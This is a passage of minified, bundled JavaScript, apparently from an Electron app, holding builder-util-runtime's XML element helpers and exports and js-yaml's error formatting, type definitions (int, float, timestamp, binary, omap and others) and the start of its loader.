      this.attributes !== null && delete this.attributes[e];
    }
    element(e, o = !1, n = null) {
      const s = this.elementOrNull(e, o);
      if (s === null)
        throw (0, i.newError)(
          n || `No element "${e}"`,
          "ERR_XML_MISSED_ELEMENT"
        );
      return s;
    }
    elementOrNull(e, o = !1) {
      if (this.elements === null) return null;
      for (const n of this.elements) if (t(n, e, o)) return n;
      return null;
    }
    getElements(e, o = !1) {
      return this.elements === null
        ? []
        : this.elements.filter((n) => t(n, e, o));
    }
    elementValueOrEmpty(e, o = !1) {
      const n = this.elementOrNull(e, o);
      return n === null ? "" : n.value;
    }
  }
  qt.XElement = c;
  const h = new RegExp(/^[A-Za-z_][:A-Za-z0-9_-]*$/i);
  function f(l) {
    return h.test(l);
  }
  function t(l, e, o) {
    const n = l.name;
    return (
      n === e ||
      (o === !0 && n.length === e.length && n.toLowerCase() === e.toLowerCase())
    );
  }
  function r(l) {
    let e = null;
    const o = a.parser(!0, {}),
      n = [];
    return (
      (o.onopentag = (s) => {
        const u = new c(s.name);
        if (((u.attributes = s.attributes), e === null)) e = u;
        else {
          const m = n[n.length - 1];
          m.elements == null && (m.elements = []), m.elements.push(u);
        }
        n.push(u);
      }),
      (o.onclosetag = () => {
        n.pop();
      }),
      (o.ontext = (s) => {
        n.length > 0 && (n[n.length - 1].value = s);
      }),
      (o.oncdata = (s) => {
        const u = n[n.length - 1];
        (u.value = s), (u.isCData = !0);
      }),
      (o.onerror = (s) => {
        throw s;
      }),
      o.write(l),
      e
    );
  }
  return qt;
}
var es;
function Be() {
  return (
    es ||
    ((es = 1),
      (function (a) {
        Object.defineProperty(a, "__esModule", { value: !0 }),
          (a.CURRENT_APP_PACKAGE_FILE_NAME =
            a.CURRENT_APP_INSTALLER_FILE_NAME =
            a.XElement =
            a.parseXml =
            a.UUID =
            a.parseDn =
            a.retry =
            a.githubUrl =
            a.getS3LikeProviderBaseUrl =
            a.ProgressCallbackTransform =
            a.MemoLazy =
            a.safeStringifyJson =
            a.safeGetHeader =
            a.parseJson =
            a.HttpExecutor =
            a.HttpError =
            a.DigestTransform =
            a.createHttpError =
            a.configureRequestUrl =
            a.configureRequestOptionsFromUrl =
            a.configureRequestOptions =
            a.newError =
            a.CancellationToken =
            a.CancellationError =
            void 0),
          (a.asArray = s);
        var i = Oo();
        Object.defineProperty(a, "CancellationError", {
          enumerable: !0,
          get: function () {
            return i.CancellationError;
          },
        }),
          Object.defineProperty(a, "CancellationToken", {
            enumerable: !0,
            get: function () {
              return i.CancellationToken;
            },
          });
        var c = zr();
        Object.defineProperty(a, "newError", {
          enumerable: !0,
          get: function () {
            return c.newError;
          },
        });
        var h = Df();
        Object.defineProperty(a, "configureRequestOptions", {
          enumerable: !0,
          get: function () {
            return h.configureRequestOptions;
          },
        }),
          Object.defineProperty(a, "configureRequestOptionsFromUrl", {
            enumerable: !0,
            get: function () {
              return h.configureRequestOptionsFromUrl;
            },
          }),
          Object.defineProperty(a, "configureRequestUrl", {
            enumerable: !0,
            get: function () {
              return h.configureRequestUrl;
            },
          }),
          Object.defineProperty(a, "createHttpError", {
            enumerable: !0,
            get: function () {
              return h.createHttpError;
            },
          }),
          Object.defineProperty(a, "DigestTransform", {
            enumerable: !0,
            get: function () {
              return h.DigestTransform;
            },
          }),
          Object.defineProperty(a, "HttpError", {
            enumerable: !0,
            get: function () {
              return h.HttpError;
            },
          }),
          Object.defineProperty(a, "HttpExecutor", {
            enumerable: !0,
            get: function () {
              return h.HttpExecutor;
            },
          }),
          Object.defineProperty(a, "parseJson", {
            enumerable: !0,
            get: function () {
              return h.parseJson;
            },
          }),
          Object.defineProperty(a, "safeGetHeader", {
            enumerable: !0,
            get: function () {
              return h.safeGetHeader;
            },
          }),
          Object.defineProperty(a, "safeStringifyJson", {
            enumerable: !0,
            get: function () {
              return h.safeStringifyJson;
            },
          });
        var f = xf();
        Object.defineProperty(a, "MemoLazy", {
          enumerable: !0,
          get: function () {
            return f.MemoLazy;
          },
        });
        var t = Pl();
        Object.defineProperty(a, "ProgressCallbackTransform", {
          enumerable: !0,
          get: function () {
            return t.ProgressCallbackTransform;
          },
        });
        var r = Nf();
        Object.defineProperty(a, "getS3LikeProviderBaseUrl", {
          enumerable: !0,
          get: function () {
            return r.getS3LikeProviderBaseUrl;
          },
        }),
          Object.defineProperty(a, "githubUrl", {
            enumerable: !0,
            get: function () {
              return r.githubUrl;
            },
          });
        var l = Ff();
        Object.defineProperty(a, "retry", {
          enumerable: !0,
          get: function () {
            return l.retry;
          },
        });
        var e = $f();
        Object.defineProperty(a, "parseDn", {
          enumerable: !0,
          get: function () {
            return e.parseDn;
          },
        });
        var o = Lf();
        Object.defineProperty(a, "UUID", {
          enumerable: !0,
          get: function () {
            return o.UUID;
          },
        });
        var n = kf();
        Object.defineProperty(a, "parseXml", {
          enumerable: !0,
          get: function () {
            return n.parseXml;
          },
        }),
          Object.defineProperty(a, "XElement", {
            enumerable: !0,
            get: function () {
              return n.XElement;
            },
          }),
          (a.CURRENT_APP_INSTALLER_FILE_NAME = "installer.exe"),
          (a.CURRENT_APP_PACKAGE_FILE_NAME = "package.7z");
        function s(u) {
          return u == null ? [] : Array.isArray(u) ? u : [u];
        }
      })($n)),
    $n
  );
}
var Ve = {},
  Br = {},
  wt = {},
  ts;
function Sr() {
  if (ts) return wt;
  ts = 1;
  function a(r) {
    return typeof r > "u" || r === null;
  }
  function i(r) {
    return typeof r == "object" && r !== null;
  }
  function c(r) {
    return Array.isArray(r) ? r : a(r) ? [] : [r];
  }
  function h(r, l) {
    var e, o, n, s;
    if (l)
      for (s = Object.keys(l), e = 0, o = s.length; e < o; e += 1)
        (n = s[e]), (r[n] = l[n]);
    return r;
  }
  function f(r, l) {
    var e = "",
      o;
    for (o = 0; o < l; o += 1) e += r;
    return e;
  }
  function t(r) {
    return r === 0 && Number.NEGATIVE_INFINITY === 1 / r;
  }
  return (
    (wt.isNothing = a),
    (wt.isObject = i),
    (wt.toArray = c),
    (wt.repeat = f),
    (wt.isNegativeZero = t),
    (wt.extend = h),
    wt
  );
}
var Bn, rs;
function Tr() {
  if (rs) return Bn;
  rs = 1;
  function a(c, h) {
    var f = "",
      t = c.reason || "(unknown reason)";
    return c.mark
      ? (c.mark.name && (f += 'in "' + c.mark.name + '" '),
        (f += "(" + (c.mark.line + 1) + ":" + (c.mark.column + 1) + ")"),
        !h &&
        c.mark.snippet &&
        (f +=
          `

` + c.mark.snippet),
        t + " " + f)
      : t;
  }
  function i(c, h) {
    Error.call(this),
      (this.name = "YAMLException"),
      (this.reason = c),
      (this.mark = h),
      (this.message = a(this, !1)),
      Error.captureStackTrace
        ? Error.captureStackTrace(this, this.constructor)
        : (this.stack = new Error().stack || "");
  }
  return (
    (i.prototype = Object.create(Error.prototype)),
    (i.prototype.constructor = i),
    (i.prototype.toString = function (h) {
      return this.name + ": " + a(this, h);
    }),
    (Bn = i),
    Bn
  );
}
var jn, ns;
function qf() {
  if (ns) return jn;
  ns = 1;
  var a = Sr();
  function i(f, t, r, l, e) {
    var o = "",
      n = "",
      s = Math.floor(e / 2) - 1;
    return (
      l - t > s && ((o = " ... "), (t = l - s + o.length)),
      r - l > s && ((n = " ..."), (r = l + s - n.length)),
      { str: o + f.slice(t, r).replace(/\t/g, "→") + n, pos: l - t + o.length }
    );
  }
  function c(f, t) {
    return a.repeat(" ", t - f.length) + f;
  }
  function h(f, t) {
    if (((t = Object.create(t || null)), !f.buffer)) return null;
    t.maxLength || (t.maxLength = 79),
      typeof t.indent != "number" && (t.indent = 1),
      typeof t.linesBefore != "number" && (t.linesBefore = 3),
      typeof t.linesAfter != "number" && (t.linesAfter = 2);
    for (
      var r = /\r?\n|\r|\0/g, l = [0], e = [], o, n = -1;
      (o = r.exec(f.buffer));

    )
      e.push(o.index),
        l.push(o.index + o[0].length),
        f.position <= o.index && n < 0 && (n = l.length - 2);
    n < 0 && (n = l.length - 1);
    var s = "",
      u,
      m,
      E = Math.min(f.line + t.linesAfter, e.length).toString().length,
      y = t.maxLength - (t.indent + E + 3);
    for (u = 1; u <= t.linesBefore && !(n - u < 0); u++)
      (m = i(f.buffer, l[n - u], e[n - u], f.position - (l[n] - l[n - u]), y)),
        (s =
          a.repeat(" ", t.indent) +
          c((f.line - u + 1).toString(), E) +
          " | " +
          m.str +
          `
` +
          s);
    for (
      m = i(f.buffer, l[n], e[n], f.position, y),
      s +=
      a.repeat(" ", t.indent) +
      c((f.line + 1).toString(), E) +
      " | " +
      m.str +
      `
`,
      s +=
      a.repeat("-", t.indent + E + 3 + m.pos) +
      `^
`,
      u = 1;
      u <= t.linesAfter && !(n + u >= e.length);
      u++
    )
      (m = i(f.buffer, l[n + u], e[n + u], f.position - (l[n] - l[n + u]), y)),
        (s +=
          a.repeat(" ", t.indent) +
          c((f.line + u + 1).toString(), E) +
          " | " +
          m.str +
          `
`);
    return s.replace(/\n$/, "");
  }
  return (jn = h), jn;
}
var Hn, is;
function ze() {
  if (is) return Hn;
  is = 1;
  var a = Tr(),
    i = [
      "kind",
      "multi",
      "resolve",
      "construct",
      "instanceOf",
      "predicate",
      "represent",
      "representName",
      "defaultStyle",
      "styleAliases",
    ],
    c = ["scalar", "sequence", "mapping"];
  function h(t) {
    var r = {};
    return (
      t !== null &&
      Object.keys(t).forEach(function (l) {
        t[l].forEach(function (e) {
          r[String(e)] = l;
        });
      }),
      r
    );
  }
  function f(t, r) {
    if (
      ((r = r || {}),
        Object.keys(r).forEach(function (l) {
          if (i.indexOf(l) === -1)
            throw new a(
              'Unknown option "' +
              l +
              '" is met in definition of "' +
              t +
              '" YAML type.'
            );
        }),
        (this.options = r),
        (this.tag = t),
        (this.kind = r.kind || null),
        (this.resolve =
          r.resolve ||
          function () {
            return !0;
          }),
        (this.construct =
          r.construct ||
          function (l) {
            return l;
          }),
        (this.instanceOf = r.instanceOf || null),
        (this.predicate = r.predicate || null),
        (this.represent = r.represent || null),
        (this.representName = r.representName || null),
        (this.defaultStyle = r.defaultStyle || null),
        (this.multi = r.multi || !1),
        (this.styleAliases = h(r.styleAliases || null)),
        c.indexOf(this.kind) === -1)
    )
      throw new a(
        'Unknown kind "' +
        this.kind +
        '" is specified for "' +
        t +
        '" YAML type.'
      );
  }
  return (Hn = f), Hn;
}
var Gn, os;
function Cl() {
  if (os) return Gn;
  os = 1;
  var a = Tr(),
    i = ze();
  function c(t, r) {
    var l = [];
    return (
      t[r].forEach(function (e) {
        var o = l.length;
        l.forEach(function (n, s) {
          n.tag === e.tag &&
            n.kind === e.kind &&
            n.multi === e.multi &&
            (o = s);
        }),
          (l[o] = e);
      }),
      l
    );
  }
  function h() {
    var t = {
      scalar: {},
      sequence: {},
      mapping: {},
      fallback: {},
      multi: { scalar: [], sequence: [], mapping: [], fallback: [] },
    },
      r,
      l;
    function e(o) {
      o.multi
        ? (t.multi[o.kind].push(o), t.multi.fallback.push(o))
        : (t[o.kind][o.tag] = t.fallback[o.tag] = o);
    }
    for (r = 0, l = arguments.length; r < l; r += 1) arguments[r].forEach(e);
    return t;
  }
  function f(t) {
    return this.extend(t);
  }
  return (
    (f.prototype.extend = function (r) {
      var l = [],
        e = [];
      if (r instanceof i) e.push(r);
      else if (Array.isArray(r)) e = e.concat(r);
      else if (r && (Array.isArray(r.implicit) || Array.isArray(r.explicit)))
        r.implicit && (l = l.concat(r.implicit)),
          r.explicit && (e = e.concat(r.explicit));
      else
        throw new a(
          "Schema.extend argument should be a Type, [ Type ], or a schema definition ({ implicit: [...], explicit: [...] })"
        );
      l.forEach(function (n) {
        if (!(n instanceof i))
          throw new a(
            "Specified list of YAML types (or a single Type object) contains a non-Type object."
          );
        if (n.loadKind && n.loadKind !== "scalar")
          throw new a(
            "There is a non-scalar type in the implicit list of a schema. Implicit resolving of such types is not supported."
          );
        if (n.multi)
          throw new a(
            "There is a multi type in the implicit list of a schema. Multi tags can only be listed as explicit."
          );
      }),
        e.forEach(function (n) {
          if (!(n instanceof i))
            throw new a(
              "Specified list of YAML types (or a single Type object) contains a non-Type object."
            );
        });
      var o = Object.create(f.prototype);
      return (
        (o.implicit = (this.implicit || []).concat(l)),
        (o.explicit = (this.explicit || []).concat(e)),
        (o.compiledImplicit = c(o, "implicit")),
        (o.compiledExplicit = c(o, "explicit")),
        (o.compiledTypeMap = h(o.compiledImplicit, o.compiledExplicit)),
        o
      );
    }),
    (Gn = f),
    Gn
  );
}
var Vn, as;
function Il() {
  if (as) return Vn;
  as = 1;
  var a = ze();
  return (
    (Vn = new a("tag:yaml.org,2002:str", {
      kind: "scalar",
      construct: function (i) {
        return i !== null ? i : "";
      },
    })),
    Vn
  );
}
var Wn, ss;
function Ol() {
  if (ss) return Wn;
  ss = 1;
  var a = ze();
  return (
    (Wn = new a("tag:yaml.org,2002:seq", {
      kind: "sequence",
      construct: function (i) {
        return i !== null ? i : [];
      },
    })),
    Wn
  );
}
var zn, us;
function Dl() {
  if (us) return zn;
  us = 1;
  var a = ze();
  return (
    (zn = new a("tag:yaml.org,2002:map", {
      kind: "mapping",
      construct: function (i) {
        return i !== null ? i : {};
      },
    })),
    zn
  );
}
var Yn, ls;
function xl() {
  if (ls) return Yn;
  ls = 1;
  var a = Cl();
  return (Yn = new a({ explicit: [Il(), Ol(), Dl()] })), Yn;
}
var Kn, cs;
function Nl() {
  if (cs) return Kn;
  cs = 1;
  var a = ze();
  function i(f) {
    if (f === null) return !0;
    var t = f.length;
    return (
      (t === 1 && f === "~") ||
      (t === 4 && (f === "null" || f === "Null" || f === "NULL"))
    );
  }
  function c() {
    return null;
  }
  function h(f) {
    return f === null;
  }
  return (
    (Kn = new a("tag:yaml.org,2002:null", {
      kind: "scalar",
      resolve: i,
      construct: c,
      predicate: h,
      represent: {
        canonical: function () {
          return "~";
        },
        lowercase: function () {
          return "null";
        },
        uppercase: function () {
          return "NULL";
        },
        camelcase: function () {
          return "Null";
        },
        empty: function () {
          return "";
        },
      },
      defaultStyle: "lowercase",
    })),
    Kn
  );
}
var Xn, fs;
function Fl() {
  if (fs) return Xn;
  fs = 1;
  var a = ze();
  function i(f) {
    if (f === null) return !1;
    var t = f.length;
    return (
      (t === 4 && (f === "true" || f === "True" || f === "TRUE")) ||
      (t === 5 && (f === "false" || f === "False" || f === "FALSE"))
    );
  }
  function c(f) {
    return f === "true" || f === "True" || f === "TRUE";
  }
  function h(f) {
    return Object.prototype.toString.call(f) === "[object Boolean]";
  }
  return (
    (Xn = new a("tag:yaml.org,2002:bool", {
      kind: "scalar",
      resolve: i,
      construct: c,
      predicate: h,
      represent: {
        lowercase: function (f) {
          return f ? "true" : "false";
        },
        uppercase: function (f) {
          return f ? "TRUE" : "FALSE";
        },
        camelcase: function (f) {
          return f ? "True" : "False";
        },
      },
      defaultStyle: "lowercase",
    })),
    Xn
  );
}
var Jn, ds;
function $l() {
  if (ds) return Jn;
  ds = 1;
  var a = Sr(),
    i = ze();
  function c(e) {
    return (
      (48 <= e && e <= 57) || (65 <= e && e <= 70) || (97 <= e && e <= 102)
    );
  }
  function h(e) {
    return 48 <= e && e <= 55;
  }
  function f(e) {
    return 48 <= e && e <= 57;
  }
  function t(e) {
    if (e === null) return !1;
    var o = e.length,
      n = 0,
      s = !1,
      u;
    if (!o) return !1;
    if (((u = e[n]), (u === "-" || u === "+") && (u = e[++n]), u === "0")) {
      if (n + 1 === o) return !0;
      if (((u = e[++n]), u === "b")) {
        for (n++; n < o; n++)
          if (((u = e[n]), u !== "_")) {
            if (u !== "0" && u !== "1") return !1;
            s = !0;
          }
        return s && u !== "_";
      }
      if (u === "x") {
        for (n++; n < o; n++)
          if (((u = e[n]), u !== "_")) {
            if (!c(e.charCodeAt(n))) return !1;
            s = !0;
          }
        return s && u !== "_";
      }
      if (u === "o") {
        for (n++; n < o; n++)
          if (((u = e[n]), u !== "_")) {
            if (!h(e.charCodeAt(n))) return !1;
            s = !0;
          }
        return s && u !== "_";
      }
    }
    if (u === "_") return !1;
    for (; n < o; n++)
      if (((u = e[n]), u !== "_")) {
        if (!f(e.charCodeAt(n))) return !1;
        s = !0;
      }
    return !(!s || u === "_");
  }
  function r(e) {
    var o = e,
      n = 1,
      s;
    if (
      (o.indexOf("_") !== -1 && (o = o.replace(/_/g, "")),
        (s = o[0]),
        (s === "-" || s === "+") &&
        (s === "-" && (n = -1), (o = o.slice(1)), (s = o[0])),
        o === "0")
    )
      return 0;
    if (s === "0") {
      if (o[1] === "b") return n * parseInt(o.slice(2), 2);
      if (o[1] === "x") return n * parseInt(o.slice(2), 16);
      if (o[1] === "o") return n * parseInt(o.slice(2), 8);
    }
    return n * parseInt(o, 10);
  }
  function l(e) {
    return (
      Object.prototype.toString.call(e) === "[object Number]" &&
      e % 1 === 0 &&
      !a.isNegativeZero(e)
    );
  }
  return (
    (Jn = new i("tag:yaml.org,2002:int", {
      kind: "scalar",
      resolve: t,
      construct: r,
      predicate: l,
      represent: {
        binary: function (e) {
          return e >= 0 ? "0b" + e.toString(2) : "-0b" + e.toString(2).slice(1);
        },
        octal: function (e) {
          return e >= 0 ? "0o" + e.toString(8) : "-0o" + e.toString(8).slice(1);
        },
        decimal: function (e) {
          return e.toString(10);
        },
        hexadecimal: function (e) {
          return e >= 0
            ? "0x" + e.toString(16).toUpperCase()
            : "-0x" + e.toString(16).toUpperCase().slice(1);
        },
      },
      defaultStyle: "decimal",
      styleAliases: {
        binary: [2, "bin"],
        octal: [8, "oct"],
        decimal: [10, "dec"],
        hexadecimal: [16, "hex"],
      },
    })),
    Jn
  );
}
var Qn, hs;
function Ll() {
  if (hs) return Qn;
  hs = 1;
  var a = Sr(),
    i = ze(),
    c = new RegExp(
      "^(?:[-+]?(?:[0-9][0-9_]*)(?:\\.[0-9_]*)?(?:[eE][-+]?[0-9]+)?|\\.[0-9_]+(?:[eE][-+]?[0-9]+)?|[-+]?\\.(?:inf|Inf|INF)|\\.(?:nan|NaN|NAN))$"
    );
  function h(e) {
    return !(e === null || !c.test(e) || e[e.length - 1] === "_");
  }
  function f(e) {
    var o, n;
    return (
      (o = e.replace(/_/g, "").toLowerCase()),
      (n = o[0] === "-" ? -1 : 1),
      "+-".indexOf(o[0]) >= 0 && (o = o.slice(1)),
      o === ".inf"
        ? n === 1
          ? Number.POSITIVE_INFINITY
          : Number.NEGATIVE_INFINITY
        : o === ".nan"
          ? NaN
          : n * parseFloat(o, 10)
    );
  }
  var t = /^[-+]?[0-9]+e/;
  function r(e, o) {
    var n;
    if (isNaN(e))
      switch (o) {
        case "lowercase":
          return ".nan";
        case "uppercase":
          return ".NAN";
        case "camelcase":
          return ".NaN";
      }
    else if (Number.POSITIVE_INFINITY === e)
      switch (o) {
        case "lowercase":
          return ".inf";
        case "uppercase":
          return ".INF";
        case "camelcase":
          return ".Inf";
      }
    else if (Number.NEGATIVE_INFINITY === e)
      switch (o) {
        case "lowercase":
          return "-.inf";
        case "uppercase":
          return "-.INF";
        case "camelcase":
          return "-.Inf";
      }
    else if (a.isNegativeZero(e)) return "-0.0";
    return (n = e.toString(10)), t.test(n) ? n.replace("e", ".e") : n;
  }
  function l(e) {
    return (
      Object.prototype.toString.call(e) === "[object Number]" &&
      (e % 1 !== 0 || a.isNegativeZero(e))
    );
  }
  return (
    (Qn = new i("tag:yaml.org,2002:float", {
      kind: "scalar",
      resolve: h,
      construct: f,
      predicate: l,
      represent: r,
      defaultStyle: "lowercase",
    })),
    Qn
  );
}
var Zn, ps;
function Ul() {
  return (
    ps ||
    ((ps = 1), (Zn = xl().extend({ implicit: [Nl(), Fl(), $l(), Ll()] }))),
    Zn
  );
}
var ei, ms;
function kl() {
  return ms || ((ms = 1), (ei = Ul())), ei;
}
var ti, gs;
function ql() {
  if (gs) return ti;
  gs = 1;
  var a = ze(),
    i = new RegExp("^([0-9][0-9][0-9][0-9])-([0-9][0-9])-([0-9][0-9])$"),
    c = new RegExp(
      "^([0-9][0-9][0-9][0-9])-([0-9][0-9]?)-([0-9][0-9]?)(?:[Tt]|[ \\t]+)([0-9][0-9]?):([0-9][0-9]):([0-9][0-9])(?:\\.([0-9]*))?(?:[ \\t]*(Z|([-+])([0-9][0-9]?)(?::([0-9][0-9]))?))?$"
    );
  function h(r) {
    return r === null ? !1 : i.exec(r) !== null || c.exec(r) !== null;
  }
  function f(r) {
    var l,
      e,
      o,
      n,
      s,
      u,
      m,
      E = 0,
      y = null,
      p,
      A,
      S;
    if (((l = i.exec(r)), l === null && (l = c.exec(r)), l === null))
      throw new Error("Date resolve error");
    if (((e = +l[1]), (o = +l[2] - 1), (n = +l[3]), !l[4]))
      return new Date(Date.UTC(e, o, n));
    if (((s = +l[4]), (u = +l[5]), (m = +l[6]), l[7])) {
      for (E = l[7].slice(0, 3); E.length < 3;) E += "0";
      E = +E;
    }
    return (
      l[9] &&
      ((p = +l[10]),
        (A = +(l[11] || 0)),
        (y = (p * 60 + A) * 6e4),
        l[9] === "-" && (y = -y)),
      (S = new Date(Date.UTC(e, o, n, s, u, m, E))),
      y && S.setTime(S.getTime() - y),
      S
    );
  }
  function t(r) {
    return r.toISOString();
  }
  return (
    (ti = new a("tag:yaml.org,2002:timestamp", {
      kind: "scalar",
      resolve: h,
      construct: f,
      instanceOf: Date,
      represent: t,
    })),
    ti
  );
}
var ri, vs;
function Ml() {
  if (vs) return ri;
  vs = 1;
  var a = ze();
  function i(c) {
    return c === "<<" || c === null;
  }
  return (
    (ri = new a("tag:yaml.org,2002:merge", { kind: "scalar", resolve: i })), ri
  );
}
var ni, ws;
function Bl() {
  if (ws) return ni;
  ws = 1;
  var a = ze(),
    i = `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
\r`;
  function c(r) {
    if (r === null) return !1;
    var l,
      e,
      o = 0,
      n = r.length,
      s = i;
    for (e = 0; e < n; e++)
      if (((l = s.indexOf(r.charAt(e))), !(l > 64))) {
        if (l < 0) return !1;
        o += 6;
      }
    return o % 8 === 0;
  }
  function h(r) {
    var l,
      e,
      o = r.replace(/[\r\n=]/g, ""),
      n = o.length,
      s = i,
      u = 0,
      m = [];
    for (l = 0; l < n; l++)
      l % 4 === 0 &&
        l &&
        (m.push((u >> 16) & 255), m.push((u >> 8) & 255), m.push(u & 255)),
        (u = (u << 6) | s.indexOf(o.charAt(l)));
    return (
      (e = (n % 4) * 6),
      e === 0
        ? (m.push((u >> 16) & 255), m.push((u >> 8) & 255), m.push(u & 255))
        : e === 18
          ? (m.push((u >> 10) & 255), m.push((u >> 2) & 255))
          : e === 12 && m.push((u >> 4) & 255),
      new Uint8Array(m)
    );
  }
  function f(r) {
    var l = "",
      e = 0,
      o,
      n,
      s = r.length,
      u = i;
    for (o = 0; o < s; o++)
      o % 3 === 0 &&
        o &&
        ((l += u[(e >> 18) & 63]),
          (l += u[(e >> 12) & 63]),
          (l += u[(e >> 6) & 63]),
          (l += u[e & 63])),
        (e = (e << 8) + r[o]);
    return (
      (n = s % 3),
      n === 0
        ? ((l += u[(e >> 18) & 63]),
          (l += u[(e >> 12) & 63]),
          (l += u[(e >> 6) & 63]),
          (l += u[e & 63]))
        : n === 2
          ? ((l += u[(e >> 10) & 63]),
            (l += u[(e >> 4) & 63]),
            (l += u[(e << 2) & 63]),
            (l += u[64]))
          : n === 1 &&
          ((l += u[(e >> 2) & 63]),
            (l += u[(e << 4) & 63]),
            (l += u[64]),
            (l += u[64])),
      l
    );
  }
  function t(r) {
    return Object.prototype.toString.call(r) === "[object Uint8Array]";
  }
  return (
    (ni = new a("tag:yaml.org,2002:binary", {
      kind: "scalar",
      resolve: c,
      construct: h,
      predicate: t,
      represent: f,
    })),
    ni
  );
}
var ii, ys;
function jl() {
  if (ys) return ii;
  ys = 1;
  var a = ze(),
    i = Object.prototype.hasOwnProperty,
    c = Object.prototype.toString;
  function h(t) {
    if (t === null) return !0;
    var r = [],
      l,
      e,
      o,
      n,
      s,
      u = t;
    for (l = 0, e = u.length; l < e; l += 1) {
      if (((o = u[l]), (s = !1), c.call(o) !== "[object Object]")) return !1;
      for (n in o)
        if (i.call(o, n))
          if (!s) s = !0;
          else return !1;
      if (!s) return !1;
      if (r.indexOf(n) === -1) r.push(n);
      else return !1;
    }
    return !0;
  }
  function f(t) {
    return t !== null ? t : [];
  }
  return (
    (ii = new a("tag:yaml.org,2002:omap", {
      kind: "sequence",
      resolve: h,
      construct: f,
    })),
    ii
  );
}
var oi, Es;
function Hl() {
  if (Es) return oi;
  Es = 1;
  var a = ze(),
    i = Object.prototype.toString;
  function c(f) {
    if (f === null) return !0;
    var t,
      r,
      l,
      e,
      o,
      n = f;
    for (o = new Array(n.length), t = 0, r = n.length; t < r; t += 1) {
      if (
        ((l = n[t]),
          i.call(l) !== "[object Object]" ||
          ((e = Object.keys(l)), e.length !== 1))
      )
        return !1;
      o[t] = [e[0], l[e[0]]];
    }
    return !0;
  }
  function h(f) {
    if (f === null) return [];
    var t,
      r,
      l,
      e,
      o,
      n = f;
    for (o = new Array(n.length), t = 0, r = n.length; t < r; t += 1)
      (l = n[t]), (e = Object.keys(l)), (o[t] = [e[0], l[e[0]]]);
    return o;
  }
  return (
    (oi = new a("tag:yaml.org,2002:pairs", {
      kind: "sequence",
      resolve: c,
      construct: h,
    })),
    oi
  );
}
var ai, _s;
function Gl() {
  if (_s) return ai;
  _s = 1;
  var a = ze(),
    i = Object.prototype.hasOwnProperty;
  function c(f) {
    if (f === null) return !0;
    var t,
      r = f;
    for (t in r) if (i.call(r, t) && r[t] !== null) return !1;
    return !0;
  }
  function h(f) {
    return f !== null ? f : {};
  }
  return (
    (ai = new a("tag:yaml.org,2002:set", {
      kind: "mapping",
      resolve: c,
      construct: h,
    })),
    ai
  );
}
var si, As;
function Do() {
  return (
    As ||
    ((As = 1),
      (si = kl().extend({
        implicit: [ql(), Ml()],
        explicit: [Bl(), jl(), Hl(), Gl()],
      }))),
    si
  );
}
var Ss;
function Mf() {
  if (Ss) return Br;
  Ss = 1;
  var a = Sr(),
    i = Tr(),
    c = qf(),
    h = Do(),
    f = Object.prototype.hasOwnProperty,
    t = 1,
    r = 2,
    l = 3,
    e = 4,
    o = 1,
    n = 2,
    s = 3,
    u =
      /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x84\x86-\x9F\uFFFE\uFFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF]/,
    m = /[\x85\u2028\u2029]/,
    E = /[,\[\]\{\}]/,
    y = /^(?:!|!!|![a-z\-]+!)$/i,
    p =
      /^(?:!|[^,\[\]\{\}])(?:%[0-9a-f]{2}|[0-9a-z\-#;\/\?:@&=\+\$,_\.!~\*'\(\)\[\]])*$/i;
  function A(d) {
    return Object.prototype.toString.call(d);
  }
  function S(d) {
    return d === 10 || d === 13;
  }
  function b(d) {
    return d === 9 || d === 32;
  }
  function R(d) {
    return d === 9 || d === 32 || d === 10 || d === 13;
  }
  function C(d) {
    return d === 44 || d === 91 || d === 93 || d === 123 || d === 125;
  }
  function v(d) {
    var B;
    return 48 <= d && d <= 57
      ? d - 48
      : ((B = d | 32), 97 <= B && B <= 102 ? B - 97 + 10 : -1);
  }
  function w(d) {
    return d === 120 ? 2 : d === 117 ? 4 : d === 85 ? 8 : 0;
  }
  function _(d) {
    return 48 <= d && d <= 57 ? d - 48 : -1;
  }
  function g(d) {
    return d === 48
      ? "\0"
      : d === 97
        ? "\x07"
        : d === 98
          ? "\b"
          : d === 116 || d === 9
            ? "	"
            : d === 110
              ? `
`
              : d === 118
                ? "\v"
                : d === 102
                  ? "\f"
                  : d === 114
                    ? "\r"
                    : d === 101
                      ? "\x1B"
                      : d === 32
                        ? " "
                        : d === 34
                          ? '"'
                          : d === 47
                            ? "/"
                            : d === 92
                              ? "\\"
                              : d === 78
                                ? ""
                                : d === 95
                                  ? " "
                                  : d === 76
                                    ? "\u2028"
                                    : d === 80
                                      ? "\u2029"
                                      : "";
  }
  function D(d) {
    return d <= 65535
      ? String.fromCharCode(d)
      : String.fromCharCode(
        ((d - 65536) >> 10) + 55296,
        ((d - 65536) & 1023) + 56320
      );
  }
  for (var O = new Array(256), N = new Array(256), L = 0; L < 256; L++)
    (O[L] = g(L) ? 1 : 0), (N[L] = g(L));
  function F(d, B) {
    (this.input = d),
      (this.filename = B.filename || null),
      (this.schema = B.schema || h),
      (this.onWarning = B.onWarning || null),
      (this.legacy = B.legacy || !1),
      (this.json = B.json || !1),
      (this.listener = B.listener || null),
      (this.implicitTypes = this.schema.compiledImplicit),
      (this.typeMap = this.schema.compiledTypeMap),
      (this.length = d.length),
      (this.position = 0),
      (this.line = 0),
      (this.lineStart = 0),
      (this.lineIndent = 0),
      (this.firstTabInLine = -1),
      (this.documents = []);
  }
  function $(d, B) {
    var V = {
      name: d.filename,
      buffer: d.input.slice(0, -1),
      position: d.position,
      line: d.line,
      column: d.position - d.lineStart,
    };
    return (V.snippet = c(V)), new i(B, V);
  }
  function k(d, B) {
    throw $(d, B);
  }
  function M(d, B) {
    d.onWarning && d.onWarning.call(null, $(d, B));
  }
  var K = {
    YAML: function (B, V, re) {
      var W, te, Z;
      B.version !== null && k(B, "duplication of %YAML directive"),
        re.length !== 1 && k(B, "YAML directive accepts exactly one argument"),
        (W = /^([0-9]+)\.([0-9]+)$/.exec(re[0])),
        W === null && k(B, "ill-formed argument of the YAML directive"),
        (te = parseInt(W[1], 10)),
        (Z = parseInt(W[2], 10)),
        te !== 1 && k(B, "unacceptable YAML version of the document"),
        (B.version = re[0]),
        (B.checkLineBreaks = Z < 2),
        Z !== 1 && Z !== 2 && M(B, "unsupported YAML version of the document");
    },
    TAG: function (B, V, re) {
      var W, te;
